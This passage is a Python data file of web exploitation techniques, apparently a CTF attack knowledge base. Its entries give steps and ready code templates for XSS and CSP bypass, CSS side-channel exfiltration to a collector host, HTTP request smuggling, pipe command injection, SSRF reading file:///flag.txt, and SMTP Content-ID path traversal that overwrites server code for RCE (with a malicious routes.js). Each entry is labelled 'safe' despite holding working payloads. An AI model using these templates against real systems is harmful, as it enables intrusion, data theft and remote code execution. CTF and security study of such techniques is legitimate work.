                        "When DOMPurify's SAFE_FOR_TEMPLATES mode allows custom elements, "
                        "mutation XSS is possible by combining math/table context switching with style tags. "
                        "When server-side sanitized HTML is re-parsed via innerHTML on the client, "
                        "the DOM structure changes and event handlers become active."
                    ),
                },
            ],
            "tags": ["xss", "mxss", "dompurify", "custom-element", "mutation-xss", "sanitizer-bypass"],
        },
    },
    {
        "name": "csp_split_brain_admin_unsafe_inline",
        "vuln_type": "xss",
        "sub_technique": "csp_bypass",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["csp", "unsafe-inline", "admin", "xss", "policy-inconsistency"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "CSP split-brain — unsafe-inline on admin routes enables XSS execution",
            "applies_when": (
                "The web app applies different CSP policies per route, and admin routes have "
                "script-src 'unsafe-inline'. XSS is blocked on public pages via nonce-based CSP, "
                "but becomes executable when redirected to admin pages."
            ),
            "prerequisites": [
                "Admin route: script-src 'self' 'unsafe-inline'",
                "Public route: script-src 'nonce-...'",
                "Admin page has a sink that reflects user input (innerHTML, etc.)",
                "A way to direct users to the admin page (form submit, redirect, etc.)",
            ],
            "technique_steps_md": (
                "1. Analyze CSP headers: `req.path.startsWith('/admin')` → unsafe-inline\n"
                "2. Confirm XSS payload is blocked by CSP on public pages\n"
                "3. Find a sink on admin pages that accepts user input (innerHTML, eval, etc.)\n"
                "4. Insert form/redirect to admin page in stored content on public pages\n"
                "5. When victim (bot) visits admin page, XSS executes under unsafe-inline CSP"
            ),
            "code_template": (
                "// Express middleware CSP config (vulnerable pattern)\n"
                "if (req.path.startsWith('/admin')) {\n"
                "  res.setHeader('CSP', \"script-src 'self' 'unsafe-inline'\");\n"
                "} else {\n"
                "  res.setHeader('CSP', `script-src 'nonce-${nonce}'`);\n"
                "}\n"
                "// innerHTML = userInput on admin page → XSS possible"
            ),
            "examples": [
                {
                    "params": {
                        "admin_csp": "default-src 'self'; script-src 'self' 'unsafe-inline'; base-uri 'none'",
                        "public_csp": "default-src 'self'; script-src 'nonce-{random}'; base-uri 'none'",
                        "admin_sink": "/admin/page → atob(params) → fetch /admin/sanitize → innerHTML",
                    },
                },
            ],
            "tags": ["csp", "unsafe-inline", "admin", "xss", "policy-inconsistency"],
        },
    },
    {
        "name": "ejs_theme_path_traversal_css_injection",
        "vuln_type": "path_traversal",
        "sub_technique": "template_path_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["path-traversal", "css-injection", "ejs", "theme", "ui-redress"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "EJS theme path traversal — CSS file include via ../ in theme parameter",
            "applies_when": (
                "In EJS (or similar template engine), a user-controllable theme value is "
                "directly inserted into the CSS path. "
                "In a pattern like `<link href=\"/css/theme/<%= theme %>.css\">`, "
                "setting `theme: \"../switch\"` loads a different CSS file."
            ),
            "prerequisites": [
                "Theme parameter is stored in DB or directly reflected from URL",
                "Inserted into CSS path without server-side validation",
                "An alternative CSS file exists that can be loaded (within static directory)",
            ],
            "technique_steps_md": (
                "1. Enter `../switch` in the theme field when creating a post (no server validation)\n"
                "2. On render: `<link href=\"/css/theme/../switch.css\">` → loads `/css/switch.css`\n"
                "3. switch.css provides absolute positioning via `.slider` class\n"
                "4. Insert a submit button with `.slider` class into post content\n"
                "5. Overlay on top of existing UI elements (#delete, etc.) → click hijacking"
            ),
            "code_template": (
                "requests.post('{url}/post/write', json={\n"
                "    'title': 'test',\n"
                "    'content': '<form action=\"/admin/test\">'\n"
                "              '<button type=\"submit\" class=\"slider\"></button>'\n"
                "              '</form>',\n"
                "    'theme': '../switch'\n"
                "}, cookies={'jwt': token})"
            ),
            "examples": [
                {
                    "params": {
                        "template": '<link rel="stylesheet" href="/css/theme/<%= post.theme %>.css">',
                        "payload_theme": "../switch",
                        "loaded_css": "/css/switch.css",
                        "css_effect": ".slider { position: absolute; width/height: 100% }",
                    },
                },
            ],
            "tags": ["path-traversal", "css-injection", "ejs", "theme", "ui-redress", "clickjacking"],
        },
    },
    {
        "name": "headless_bot_click_hijack_css_overlay",
        "vuln_type": "xss",
        "sub_technique": "css_clickjacking",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["clickjacking", "headless-browser", "puppeteer", "css", "bot", "ui-redress"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Headless bot click hijacking via CSS absolute position overlay",
            "applies_when": (
                "A CTF or web app has a headless browser bot (Puppeteer, etc.) that visits a page "
                "and clicks a specific element (#delete, etc.). User-controllable HTML/CSS can overlay "
                "another element on top of the click target, hijacking the bot's click to perform "
                "a different action (form submit, etc.)."
            ),
            "prerequisites": [
                "Headless browser bot visits a page and clicks a specific element",
                "User can insert form/button into HTML content",
                "CSS absolute/fixed positioning is available (theme traversal, inline style, etc.)",
                "Bot visits with an authenticated session (cookie)",
            ],
            "technique_steps_md": (
                "1. Analyze bot behavior: `page.$('#delete').click()` etc.\n"
                "2. Insert `<form action=\"/target\">` + `<button class=\"slider\">` into user content\n"
                "3. CSS (.slider) covers entire area with position: absolute + width/height: 100%\n"
                "4. Bot attempts to click #delete → actually clicks .slider submit button\n"
                "5. Form sends GET request to /target with authenticated session → delivers attacker payload"
            ),
            "code_template": (
                "<!-- Post content with clickjack overlay -->\n"
                "<form action=\"http://target/admin/test\">\n"
                "    <input type=\"hidden\" name=\"title\" value=\"{b64_title}\">\n"
                "    <input type=\"hidden\" name=\"content\" value=\"{b64_xss_payload}\">\n"
                "    <button type=\"submit\" class=\"slider\"></button>\n"
                "</form>\n"
                "<!-- theme: ../switch loads CSS with .slider { position: absolute } -->"
            ),
            "examples": [
                {
                    "params": {
                        "bot_action": "page.$('#delete').click()",
                        "overlay_css": ".slider { position: absolute; cursor: pointer; width: 100%; height: 100% }",
                        "redirect_target": "/admin/page?title=...&content=<b64_xss>",
                        "bot_cookie": "JWT with sensitive data in claims",
                    },
                },
            ],
            "tags": ["clickjacking", "headless-browser", "puppeteer", "css", "bot", "ui-redress"],
        },
    },
    # ── CSS side-channel techniques ──────────────────────────────
    {
        "name": "css_import_escape_url_filter_bypass",
        "vuln_type": "xss",
        "sub_technique": "css_filter_bypass",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["css", "import", "escape", "filter-bypass", "style-injection", "exfiltration"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "CSS @import remote URL filter bypass via CSS escape sequences",
            "applies_when": (
                "Client-side JS detects and blocks remote URLs (http://, //) inside <style> blocks, "
                "but CSS escape sequences (\\3a = ':', \\2f = '/') bypass the JS regex while the "
                "browser correctly parses and loads the external resource URL."
            ),
            "prerequisites": [
                "<style> tag injection possible (e.g. in posts)",
                "Client-side JS filters remote URLs in CSS via regex",
                "Server-side allows <style> tags (not removed by DOMPurify or handled separately)",
            ],
            "technique_steps_md": (
                "1. Analyze JS filter: `/\\b(?:https?|data)\\s*:/i.test(css)` or `css.includes('//')`\n"
                "2. Bypass via CSS escape: `http\\3a \\2f \\2f attacker\\2f style.css`\n"
                "3. Load external CSS with `@import` rule: `<style>@import 'http\\3a \\2f \\2f ...';</style>`\n"
                "4. Browser decodes escapes and requests the URL normally"
            ),
            "code_template": (
                "def css_escape_url(url):\n"
                "    return (url.replace(':', '\\\\3a ')\n"
                "               .replace('/', '\\\\2f ')\n"
                "               .replace('?', '\\\\3f ')\n"
                "               .replace('=', '\\\\3d ')\n"
                "               .replace('&', '\\\\26 '))\n"
                "\n"
                "payload = f\"<style>@import '{css_escape_url(collector_url)}';</style>\""
            ),
            "examples": [{
                "params": {
                    "filter_regex": "/\\b(?:https?|data)\\s*:/i.test(css) || css.includes('//')",
                    "bypass": "http\\3a \\2f \\2f attacker:18800\\2f style.css",
                    "max_payload_len": 320,
                },
            }],
            "tags": ["css", "import", "escape", "filter-bypass", "style-injection"],
        },
    },
    {
        "name": "firefox_content_visibility_hidden_layout_bug",
        "vuln_type": "xss",
        "sub_technique": "browser_layout_quirk",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["firefox", "content-visibility", "checkVisibility", "css", "browser-bug", "defense-bypass"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Firefox content-visibility:hidden bug — checkVisibility()=false but layout still works",
            "applies_when": (
                "The web app implements a defense using JavaScript `element.checkVisibility()` to "
                "detect and remove CSS-displayed elements. "
                "A Firefox ESR 140.0 bug causes `content-visibility:hidden` to make "
                "`checkVisibility()` return false (bypassing the defense), while "
                "internal flex/grid layout, font loading, container queries, and background-image "
                "loading still work normally, enabling CSS-only attacks."
            ),
            "prerequisites": [
                "Firefox ESR 140.0 (or version with this bug)",
                "JS defense relies on checkVisibility()",
                "Attacker can set content-visibility:hidden via CSS injection",
                "Side-channel via internal layout or resource loading required",
            ],
            "technique_steps_md": (
                "1. Analyze JS defense: `f.checkVisibility()` → if true, `f.remove()`\n"
                "2. CSS injection: `#page { content-visibility: hidden !important; }`\n"
                "3. `checkVisibility()` → returns false (defense bypassed)\n"
                "4. Firefox bug: internal layout still works\n"
                "5. Execute side-channel via flex layout + font ligature + container query\n"
                "6. Ref: https://bugzilla.mozilla.org/show_bug.cgi?id=2025174"
            ),
            "code_template": (
                "#page {\n"
                "  content-visibility: hidden !important;\n"
                "  display: flex !important;\n"
                "  /* internal layout still works due to Firefox bug */\n"
                "}\n"
                "#flag {\n"
                "  display: block !important;\n"
                "  /* checkVisibility()=false so JS does not remove it */\n"
                "}"
            ),
            "examples": [{
                "params": {
                    "browser": "Firefox ESR 140.0 (headless)",
                    "bug_url": "https://bugzilla.mozilla.org/show_bug.cgi?id=2025174",
                    "defense": "setInterval(check, 50) + MutationObserver — checkVisibility() based",
                    "bypassed_checks": ["display !== none", "checkVisibility() === true"],
                },
            }],
            "tags": ["firefox", "content-visibility", "checkVisibility", "css", "browser-bug"],
        },
    },
    {
        "name": "css_font_ligature_width_side_channel",
        "vuln_type": "xss",
        "sub_technique": "css_side_channel",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["css", "font", "ligature", "side-channel", "exfiltration", "container-query"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "CSS font ligature width side-channel — character-by-character data exfiltration",
            "applies_when": (
                "Secret text exists in the DOM and the attacker can inject CSS to apply a "
                "custom font to that element. Text content can be exfiltrated one character at a "
                "time using CSS only, without JavaScript execution."
            ),
            "prerequisites": [
                "Secret text exists in a DOM element (e.g. flag div)",
                "CSS injection possible (style tag or @import)",
                "Browser supports external font loading + container queries",
                "External collector server needed (serves fonts/CSS + collects hits)",
            ],
            "technique_steps_md": (
                "1. **Build custom font**: use fonttools to build a ligature font\n"
                "   - Known prefix + each candidate character → mapped to glyphs with different widths\n"
                "   - e.g.: `known_prefix{` + `a` → width 1, `known_prefix{` + `b` → width 2, ...\n"
                "2. **CSS layout setup**: flex container + container query\n"
                "   - `#page` = flex row, fixed width\n"
                "   - `#flag` = flex: 0 0 auto (takes up text width)\n"
                "   - `.spacer` = flex: 1 1 auto + container-type: size (remaining space)\n"
                "3. **Container Query oracle**: different background-image URL based on spacer width\n"
                "   - `@container (width: Npx) { .spacer::before { background-image: url(.../hit?c=X); } }`\n"
                "4. **Exfiltrate one character**: browser loads only the matching URL → character sent to collector\n"
                "5. **Repeat**: update prefix → generate new font/CSS → exfiltrate next character"
            ),
            "code_template": (
                "# Font generation (fonttools)\n"
                "fb = FontBuilder(1000, isTTF=True)\n"
                "# generate ligature glyph with different width for each candidate character\n"
                "for i, ch in enumerate(candidates):\n"
                "    metrics[lig_name(i)] = (i + 1, 0)  # width = index+1\n"
                "# OpenType feature: sub prefix_glyphs candidate_glyph by lig_glyph\n"
                "fea = 'sub ' + ' '.join(glyph_name(c) for c in prefix) + ' ' + glyph_name(ch) + ' by ' + lig_name(i)\n"
                "\n"
                "# CSS: @font-face + flex layout + container query\n"
                "# @container (width: Npx) { background-image: url(collector/hit?c=X); }"
            ),
            "examples": [{
                "params": {
                    "flag_element": '<div id="flag">{{ flag }}</div>',
                    "font_lib": "fonttools (Python)",
                    "exfil_method": "container query → background-image URL per character",
                    "chars_per_iteration": 1,
                    "total_iterations": "flag_length - prefix_length",
                    "success_rate": "~80% per attempt, 5 retries",
                },
                "notes": (
                    "Combined with the Firefox ESR content-visibility:hidden bug. "
                    "Bypasses JS defense (checkVisibility) while executing font ligature side-channel. "
                    "5 consecutive characters exfiltrated successfully in local testing."
                ),
            }],
            "tags": ["css", "font", "ligature", "side-channel", "exfiltration", "container-query", "fonttools"],
        },
    },
    # ── HTTP smuggling / protocol confusion techniques ──────────
    {
        "name": "safe_strlen_content_length_desync",
        "vuln_type": "http_smuggling",
        "sub_technique": "content_length_desync",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["smuggling", "content-length", "desync", "php", "control-char"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "safe_strlen Content-Length desync — HTTP request smuggling via control character truncation",
            "applies_when": (
                "A PHP app computes Content-Length using a safe_strlen-style function that returns "
                "immediately on ctype_cntrl($c). When the actual body length differs from safe_strlen's "
                "result, a second request can be smuggled to the backend."
            ),
            "prerequisites": [
                "PHP safe_strlen: for-loop + ctype_cntrl → return $len (early termination on control char)",
                "PHP forwards requests to backend via curl — keep-alive connection",
                "Backend (Node.js, etc.) reads body based on actual Content-Length, leaving remaining bytes as next request",
            ],
            "technique_steps_md": (
                "1. Analyze `safe_strlen` — check if it truncates length at first control char (\\x00-\\x1f)\n"
                "2. Construct actual body: `VISIBLE_PART + \\r + SMUGGLED_HTTP_REQUEST`\n"
                "   → safe_strlen returns `len(VISIBLE_PART)`, but actual transmission is the full length\n"
                "3. PHP sends POST to backend with `Content-Length: safe_strlen(body)` (keep-alive)\n"
                "4. Backend reads only VISIBLE_PART as the first request body,\n"
                "   remaining `\\r + SMUGGLED_HTTP_REQUEST` is parsed as a new request\n"
                "5. Insert desired endpoint/header/body into smuggled request for arbitrary actions"
            ),
            "code_template": (
                "visible = b'action=healthcheck'\n"
                "smuggled = (\n"
                "    b'\\r\\n'\n"
                "    b'POST /set/{key}/{value} HTTP/1.1\\r\\n'\n"
                "    b'X-Auth: {auth_header}\\r\\n'\n"
                "    b'Content-Length: 0\\r\\n'\n"
                "    b'\\r\\n'\n"
                ")\n"
                "body = visible + b'\\r' + smuggled  # \\r triggers safe_strlen cutoff\n"
                "# PHP sees Content-Length: len(visible), backend gets both requests"
            ),
            "examples": [{
                "params": {
                    "safe_strlen_trigger": "\\r (0x0d) or any ctype_cntrl char",
                    "frontend": "PHP curl → Node.js Express",
                    "smuggled_action": "POST /set/:key/:value",
                },
                "notes": (
                    "Solvable without smuggling if there's no input sanitization, "
                    "but CL desync is required when danger()-style filters are present."
                ),
            }, {
                "params": {
                    "safe_strlen_trigger": "\\r (0x0d)",
                    "frontend": "PHP curl → Node.js Express",
                    "smuggled_action": "POST /set/:key/:value — input filter bypass",
                },
                "notes": (
                    "danger()-style function filters pipe(|)/null/newline, so "
                    "direct command injection in URL is not possible → bypass via CL desync."
                ),
            }],
            "tags": ["smuggling", "content-length", "desync", "php", "safe_strlen", "control-char", "keep-alive"],
        },
    },
    {
        "name": "memstorage_pipe_newline_command_injection",
        "vuln_type": "cmdi",
        "sub_technique": "newline_pipe_injection",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["protocol", "injection", "pipe", "newline", "tcp", "memstorage"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Memstorage pipe/newline command injection — multi-command execution via delimiter in user input",
            "applies_when": (
                "A TCP-based custom protocol server's parseCommand splits input on `|` or `\\n`, "
                "and user input from an HTTP endpoint is included directly in the protocol stream. "
                "Injecting `|CMD arg` into key/value parameters executes arbitrary protocol commands."
            ),
            "prerequisites": [
                "TCP custom protocol: parseCommand splits commands via input.split(/\\n|\\|/)",
                "HTTP→TCP bridge: Express etc. passes URL params to memstorage protocol",
                "No pipe/newline sanitization on user input (or bypassable)",
            ],
            "technique_steps_md": (
                "1. Analyze memstorage.js parseCommand — identify split delimiter (`/\\n|\\|/`)\n"
                "2. Identify useful commands from VALID_CMDS list (AUTH, AUTH_S, GET, SET, BYE, etc.)\n"
                "3. Inject pipe into key via HTTP endpoint (e.g. `/get/:key`):\n"
                "   `GET /get/test|AUTH_S <hex_creds> <hex_payload>|BYE`\n"
                "4. Express sends `GET test|AUTH_S ... |BYE` to memstorage TCP\n"
                "5. parseCommand splits on pipe → 3 commands (GET, AUTH_S, BYE) executed sequentially\n"
                "6. If AUTH_S result includes Visit=> pattern in response, SSRF chain triggers"
            ),
            "code_template": (
                "import urllib.parse\n"
                "# hex-encode the Visit=>file:///flag.txt payload\n"
                "visit_hex = 'file:///flag.txt'.encode().hex()\n"
                "crlf_hex = '0d0a0d0a'  # \\r\\n\\r\\n in hex\n"
                "injected_key = f'test|AUTH_S {crlf_hex} {visit_hex}|BYE'\n"
                "url = f'http://target/get/{urllib.parse.quote(injected_key, safe=\"\")}'"
            ),
            "examples": [{
                "params": {
                    "delimiter": "pipe (|)",
                    "injected_via": "/get/:key URL parameter",
                    "auth_cmd": "AUTH_S <hex_id> <hex_pw_or_payload>",
                },
                "notes": (
                    "Direct pipe injection possible if no input filter is present. "
                    "AUTH_S hex-decoded result contains the Visit=> payload."
                ),
            }],
            "tags": ["command-injection", "pipe", "newline", "protocol", "memstorage", "tcp", "parseCommand"],
        },
    },
    {
        "name": "visit_redirect_ssrf_chain",
        "vuln_type": "ssrf",
        "sub_technique": "redirect_chain",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["ssrf", "redirect", "visit", "file-read", "chain"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "Visit=> response-driven SSRF chain — secondary request via response body pattern",
            "applies_when": (
                "A debug_Get/api_Get-style function searches the first HTTP response body for the "
                "'Visit=>URL' pattern, extracts the URL, and sends a second request (api_Get). "
                "Injecting Visit=>file:///flag.txt into the first response achieves LFI."
            ),
            "prerequisites": [
                "PHP debug_Get: strpos('Visit=>') on response → explode → api_Get(next_url)",
                "api_Get uses curl, supporting file:// scheme",
                "Injection point available to insert Visit=>payload into first response body",
            ],
            "technique_steps_md": (
                "1. Analyze debug_Get function:\n"
                "   ```php\n"
                "   function debug_Get($url) {\n"
                "       $response = file_get_contents($url);\n"
                "       if(strpos($response, 'Visit=>') !== FALSE) {\n"
                "           $next_url = explode('Visit=>', $response)[1];\n"
                "           return api_Get($next_url);\n"
                "       }\n"
                "       return $response;\n"
                "   }\n"
                "   ```\n"
                "2. api_Get is curl-based — confirm file:// scheme support\n"
                "3. Insert `Visit=>file:///flag.txt` string into the first request's response\n"
                "   (e.g. hex-decoded payload included in memstorage AUTH_S error message)\n"
                "4. debug_Get extracts `file:///flag.txt` → api_Get(file:///flag.txt) → returns flag"
            ),
            "code_template": (
                "# Craft a URL that will make the server return Visit=>file:///flag.txt\n"
                "visit_payload = 'Visit=>file:///flag.txt'\n"
                "# Inject via memstorage AUTH_S hex encoding:\n"
                "visit_hex = visit_payload.encode().hex()\n"
                "# AUTH_S will echo hex-decoded content in error response\n"
                "debug_url = f'http://api:9090/get/test|AUTH_S 0d0a0d0a {visit_hex}|BYE'\n"
                "# Call debug action:\n"
                "requests.get(f'{base}/memstorage.php', params={'action':'debug','url':debug_url})"
            ),
            "examples": [{
                "params": {
                    "trigger_pattern": "Visit=>",
                    "second_request_func": "api_Get (curl)",
                    "injected_url": "file:///flag.txt",
                },
                "notes": (
                    "AUTH_S hex-decoded error response contains Visit=>file:///flag.txt, "
                    "causing debug_Get to read file:///flag.txt via curl and return the flag."
                ),
            }, {
                "params": {
                    "trigger_pattern": "Visit=>",
                    "second_request_func": "api_Get (curl)",
                    "injected_url": "file:///flag.txt",
                },
                "notes": (
                    "Visit=> response can be verified from memstorage via fsockopen, "
                    "but PHP 8.2+ file_get_contents HTTP parser may reject raw TCP responses."
                ),
            }],
            "tags": ["ssrf", "visit", "redirect", "file-read", "lfi", "curl", "chain", "debug_Get"],
        },
    },
    {
        "name": "http_to_tcp_protocol_confusion",
        "vuln_type": "ssrf",
        "sub_technique": "protocol_confusion",
        "category": "exploitation",
        "safety_level": "safe",
        "tags": ["protocol-confusion", "http", "tcp", "ssrf", "file_get_contents"],
        "attack_metadata": {
            "kind": "exploit_technique",
            "name": "HTTP-to-TCP protocol confusion — file_get_contents(http://) to raw TCP service",
            "applies_when": (
                "When PHP's file_get_contents('http://host:port/path') connects to a raw TCP service "
                "(non-HTTP), the HTTP request line and headers are interpreted as commands by the TCP "
                "protocol. GET /path HTTP/1.0 itself becomes input to the custom protocol."
            ),
            "prerequisites": [
                "PHP file_get_contents + http:// stream wrapper in use",
                "Target is a raw TCP service (e.g. memstorage on port 9091)",
                "TCP service's parseCommand (partially) processes the HTTP request line",
                "Strictness of parsing raw TCP response as HTTP varies by PHP version",
            ],
            "technique_steps_md": (
                "1. Induce debug action to request `http://api:9091/` URL via file_get_contents\n"
                "2. Actual data PHP sends:\n"
                "   ```\n"
                "   GET /CMD1|CMD2|CMD3 HTTP/1.0\\r\\n\n"
                "   Host: api:9091\\r\\n\n"
                "   \\r\\n\n"
                "   ```\n"
                "3. memstorage parseCommand splits `GET /CMD1|CMD2|CMD3`:\n"
                "   - `GET /CMD1` (invalid → skip)\n"
                "   - `CMD2` (valid command executed)\n"
                "   - `CMD3` (valid command executed)\n"
                "4. However, PHP's HTTP stream wrapper expects the first line of the response to be an "
                "HTTP status line — raw TCP responses usually fail. May be bypassable with ignore_errors "
                "depending on PHP version.\n"
                "5. Bypass strategy: use fsockopen for direct TCP communication from PHP, or "
                "trick memstorage response into starting with an HTTP/1.x-like first line."
            ),
            "code_template": (
                "# Pass raw TCP service URL to PHP debug action\n"
                "import urllib.parse\n"
                "cmd_payload = 'AUTH_S 0d0a0d0a ' + 'file:///flag.txt'.encode().hex() + '|BYE'\n"
                "debug_url = f'http://api:9091/{urllib.parse.quote(cmd_payload, safe=\"\")}'\n"
                "# memstorage.php?action=debug&url=<debug_url>\n"
                "# PHP sends: GET /<cmd_payload> HTTP/1.0\\r\\nHost: api:9091\\r\\n\\r\\n\n"
                "# memstorage splits on | and executes AUTH_S and BYE"
            ),
            "examples": [{
                "params": {
                    "php_function": "file_get_contents with http:// wrapper",
                    "target_service": "custom TCP service on non-HTTP port",
                    "http_request_as_command": "GET /payload HTTP/1.0 → parseCommand splits on |",
                },
                "notes": (
                    "In PHP 8.2+, file_get_contents may fail when trying to parse raw TCP "
                    "responses as HTTP headers. Direct TCP via fsockopen succeeds. "
                    "file_get_contents may also work depending on PHP version."
                ),
            }],
            "tags": ["protocol-confusion", "http-to-tcp", "file_get_contents", "ssrf", "memstorage", "raw-tcp"],
        },
    },

    # ── 22. SMTP Content-ID path traversal → arbitrary file write → RCE ────
    {
        "name": "smtp_content_id_path_traversal_rce",
        "vuln_type": "path_traversal",
        "sub_technique": "smtp_content_id",
        "attack_metadata": {
            "name": "SMTP Content-ID path traversal → arbitrary file write → RCE",
            "applies_when": (
                "A mail server (e.g. maildev) uses the Content-ID header value directly as the "
                "filename when saving attachments, with no path sanitization. "
                "Inserting `../` sequences in the attachment's Content-ID can overwrite server source "
                "code files, and the overwritten code executes on server restart, achieving RCE."
            ),
            "prerequisites": [
                "Mail can be sent to the SMTP port (default 1025) without authentication",
                "Mail server passes Content-ID directly to fs.createWriteStream when saving attachments",
                "Server source code file path is known or guessable (e.g. /home/node/lib/routes.js)",
                "Server restarts periodically or a restart can be triggered",
            ],
            "technique_steps_md": (
                "1. Analyze the mail server's attachment save logic — check `saveAttachment(id, attachment)`\n"
                "2. Vulnerable if pattern is `fs.createWriteStream(path.join(mailDir, id, attachment.contentId))`\n"
                "3. Calculate relative path from attachment save directory (`/tmp/maildev-<pid>/<id>/`) to target file:\n"
                "   - e.g.: `/tmp/maildev-1/<id>/` → `/home/node/lib/routes.js` = `../../../home/node/lib/routes.js`\n"
                "4. Send email with malicious code in attachment, Content-ID header containing path traversal:\n"
                "   ```python\n"
                "   attachment.add_header('Content-ID', '<../../../home/node/lib/routes.js>')\n"
                "   ```\n"
                "5. Malicious routes.js content: read flag file + expose via HTTP endpoint\n"
                "6. Wait for (or trigger) server restart → overwritten code is loaded → access /flag to get the flag"
            ),
            "code_template": (
                "import smtplib\n"
                "from email.mime.multipart import MIMEMultipart\n"
                "from email.mime.text import MIMEText\n"
                "from email.mime.base import MIMEBase\n\n"
                "MALICIOUS_JS = '''\n"
                "const express = require('express'); const fs = require('fs');\n"
                "module.exports = function(app, ms, bp) {\n"
                "  const r = express.Router();\n"
                "  r.get('/flag', (req,res) => res.send(fs.readFileSync('/flag','utf8')));\n"
                "  app.use(bp, r);\n"
                "};\n"
                "'''\n\n"
                "msg = MIMEMultipart('related')\n"
                "msg['From'] = 'a@evil.com'; msg['To'] = 'v@target.local'\n"
                "msg['Subject'] = 'x'\n"
                "msg.attach(MIMEText('<html><body>x</body></html>', 'html'))\n"
                "att = MIMEBase('application', 'javascript')\n"
                "att.set_payload(MALICIOUS_JS.encode())\n"
                "att.add_header('Content-ID', '<../../../home/node/lib/routes.js>')\n"
                "att.add_header('Content-Disposition', 'inline', filename='routes.js')\n"
                "msg.attach(att)\n"
                "with smtplib.SMTP('{host}', {smtp_port}) as s:\n"
                "    s.sendmail('a@evil.com', ['v@target.local'], msg.as_string())"
            ),
            "examples": [{
                "params": {
                    "host": "localhost",
                    "smtp_port": 1025,
                    "web_port": 1080,
                    "target_file": "/home/node/lib/routes.js",
                    "content_id_payload": "../../../home/node/lib/routes.js",
                    "flag_path": "/flag",
                },
                "notes": (
                    "maildev 2.0.x saveAttachment passes Content-ID directly to path.join. "
                    "After server restart, overwritten routes.js is require'd, achieving RCE. "
                    "Registered as CVE-2024-27448."
                ),
            }],
            "tags": ["smtp", "content-id", "path-traversal", "arbitrary-file-write", "rce", "maildev", "node"],
        },
    },

    # ── 23. Express req property traversal via search/getdata ───
    {
        "name": "express_req_property_traversal_leak",
        "vuln_type": "information_disclosure",
        "sub_technique": "property_traversal",
        "attack_metadata": {
            "name": "Express req object property traversal — cookie/header leak",
            "applies_when": (
                "The server passes user input (key) along with the Express req object to a "
                "getdata/resolve-style function. In a getdata(key, value, req) pattern, "
                "key = 'cookies.sessionId' etc. can access internal properties like "
                "req.cookies, req.headers, req.query."
            ),
            "prerequisites": [
                "Server handler passes req object directly to a generic data resolver",
                "Key is split by dot (.) or delimiter for recursive access",
                "Blocklist for prototype/constructor does not include cookies, headers, etc.",
            ],
            "technique_steps_md": (
                "1. Analyze data resolver at /search endpoint — check if 3rd argument is `req`\n"
                "2. Use dot-path in key for `getdata(key, value, data)`: `cookies.key`\n"
                "3. If `value='*'`, enumerate all sub-properties; specific value returns that key only\n"
                "4. When request includes cookies → leaked in response as `<p id=key>cookie_value</p>`\n"
                "5. Other req properties (headers, query, body, etc.) are accessible the same way"
            ),
            "code_template": (
                "import requests\n"
                "# Leak all cookies\n"
                "resp = requests.post('{url}/search',\n"
                "    json={'query': {'cookies': '*'}},\n"
                "    cookies={'key': 'secret_value'})\n"
                "# Response: <p id=key>secret_value</p>\n\n"
                "# Leak specific cookie char by char\n"
                "resp = requests.post('{url}/search',\n"
                "    json={'query': {'cookies.key': '*'}},\n"
                "    cookies={'key': 'secret'})\n"
                "# Response: <p id=0>s</p><p id=1>e</p>..."
            ),
            "examples": [{
                "params": {
                    "endpoint": "/search",
                    "data_arg": "req (Express request object)",
                    "leaked_property": "req.cookies.key",
                    "key_payload": "cookies or cookies.key",
                },
                "notes": (
                    "Blocklist only contains __proto__, prototype, constructor — "
                    "cookies, headers, query, etc. are not blocked. "
                    "value='*' returns all properties; specifying a key returns that value only."
                ),
            }],
            "tags": ["express", "req-traversal", "cookie-leak", "information-disclosure", "property-access"],
        },
    },

    # ── 24. isSameSite null origin bypass ────────────────────────
    {
        "name": "isamesite_null_origin_bypass",
        "vuln_type": "csrf",
        "sub_technique": "samesite_bypass",
        "attack_metadata": {
            "name": "postMessage isSameSite check bypass via null origin",
            "applies_when": (
                "Client-side JS checks isSameSite(window.origin, e.origin) on postMessage receipt, "
                "and the isSameSite implementation uses origin.slice(7).split('.').slice(-2).join('.').endsWith(...). "
                "When e.origin='null' from data: URL, sandbox iframe, or blob: URL, "
                "'null'.slice(7)='' → endsWith('')=true, always passing."
            ),
            "prerequisites": [
                "Target page performs origin check in postMessage event listener",
                "isSameSite uses slice(7) + endsWith pattern",
                "Attacker can send postMessage from data: URL or sandboxed iframe",
            ],
            "technique_steps_md": (
                "1. Analyze target page's message event listener — check isSameSite logic\n"
                "2. `origin.slice(7)` → intended to strip 'http://', but returns empty string for 'null'\n"
                "3. `''.split('.').slice(-2).join('.')` = `''`\n"
                "4. `anything.endsWith('')` = `true` — always passes\n"
                "5. Load data: URL in sandbox iframe + allow-same-origin on attacker page\n"
                "6. Inside data: URL, open target with window.open and send postMessage to iframe\n"
                "7. Establish bidirectional communication via MessageChannel port transfer"
            ),
            "code_template": (
                "<!-- Attacker page -->\n"
                "<iframe sandbox='allow-scripts allow-same-origin allow-popups'\n"
                "  id='exploit'></iframe>\n"
                "<script>\n"
                "exploit.src = `data:text/html,<script>\n"
                "  var w = window.open('{target_url}');\n"
                "  setTimeout(() => {\n"
                "    var mc = new MessageChannel();\n"
                "    mc.port1.onmessage = (e) => { /* handle response */ };\n"
                "    w[0].postMessage(1, '*', [mc.port2]);\n"
                "  }, 1000);\n"
                "<\\/script>`;\n"
                "</script>"
            ),
            "examples": [{
                "params": {
                    "target_url": "http://frontend:8080/",
                    "attacker_origin": "null (data: URL in sandbox iframe)",
                    "bypass_reason": "'null'.slice(7)='' → endsWith('')=true",
                },
                "notes": (
                    "allow-same-origin required on sandbox iframe. "
                    "After bidirectional communication via MessageChannel, window properties can be set (debug mode, etc.)."
                ),
            }],
